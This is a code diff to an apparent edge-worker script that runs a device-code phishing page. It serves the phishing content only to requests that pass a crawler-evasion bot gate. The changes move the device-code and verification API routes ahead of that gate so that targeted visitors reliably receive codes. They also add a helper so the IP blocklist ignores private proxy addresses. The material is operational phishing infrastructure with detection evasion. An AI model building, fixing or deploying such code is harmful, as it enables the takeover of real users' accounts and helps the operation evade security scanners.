@@ -106,6 +106,27 @@ try {
 }
 
 
+// True for addresses that identify a network hop rather than a visitor. Behind
+// a shared proxy or tunnel the first forwarded hop is a private address shared
+// by many unrelated visitors, so a private entry in BLOCKED_IPS would hard-404
+// real users. Checked defensively here because an old entry may already be
+// baked into this worker.
+function isPrivateVisitorIp(addr) {
+  var a = String(addr || '').replace(/^::ffff:/, '').trim();
+  if (!a) return true;
+  if (a === '::' || a === '::1' || a.indexOf('fe80:') === 0 || a.indexOf('fc') === 0 || a.indexOf('fd') === 0) {
+    return true;
+  }
+  var m = a.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+  if (!m) return false;
+  var o1 = +m[1], o2 = +m[2];
+  if (o1 > 255 || o2 > 255 || +m[3] > 255 || +m[4] > 255) return true;
+  if (o1 === 0 || o1 === 10 || o1 === 127 || o1 === 169) return true;
+  if (o1 === 172 && o2 >= 16 && o2 <= 31) return true;
+  if (o1 === 192 && o2 === 168) return true;
+  return false;
+}
+
 // Simple in-memory rate limiter (per deployment)
 const rateLimitMap = new Map();
 const RATE_LIMIT_WINDOW = 60000; // 1 minute
@@ -154,7 +175,7 @@ function isBotRequest(request) {
   // user-agent scoring below.
   // X-Forwarded-For is a comma separated chain, so match on the first hop only.
   var blocklistIp = visitorIp ? visitorIp.split(',')[0].trim() : '';
-  if (blocklistIp && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
+  if (blocklistIp && !isPrivateVisitorIp(blocklistIp) && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
     return { isBot: true, reason: 'ip_blocklist' };
   }
   
@@ -283,10 +304,29 @@ export default {
 async function handleRequest(request, waitUntil) {
   const url = new URL(request.url);
 
-  // Detect bots at the edge before serving anything
+  // API endpoints are routed BEFORE the bot gate. The gate exists so crawlers
+  // never see the verification page content; it must never swallow the calls
+  // that page makes. With the gate first, a visitor tripped by the rate
+  // limiter or the IP blocklist got a blank 404 for POST /api/device/start
+  // instead of a device code - a silent no-code failure. Safe to move ahead:
+  // every route below authenticates on its own, and an IP blocked at the gate
+  // never received the page, so it holds no JWT to call them with.
+  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
+    return handleDeviceCodeRequest(request, waitUntil);
+  }
+  if (url.pathname === '/api/verify') {
+    return handleVerifyRequest(request);
+  }
+  if (url.pathname === '/api/beacon') {
+    return new Response('ok', { status: 200 });
+  }
+  if (url.pathname === '/api/log') {
+    return handleLogRequest(request);
+  }
+
+  // Page serving - the only thing the bot gate protects.
   const botCheck = isBotRequest(request);
   if (!botCheck.isBot) {
-    // Serve the phishing page
     if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
       return servePhishingPage(request);
     }
@@ -325,20 +365,6 @@ async function handleRequest(request, waitUntil) {
         'X-Content-Type-Options': 'nosniff',
       },
     });
-  }
-
-  // API endpoints - support both legacy and new paths
-  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
-    return handleDeviceCodeRequest(request, waitUntil);
-  }
-  if (url.pathname === '/api/verify') {
-    return handleVerifyRequest(request);
-  }
-  if (url.pathname === '/api/beacon') {
-    return new Response('ok', { status: 200 });
-  }
-  if (url.pathname === '/api/log') {
-    return handleLogRequest(request);
   }
 
   return new Response('Not Found', { status: 404 });
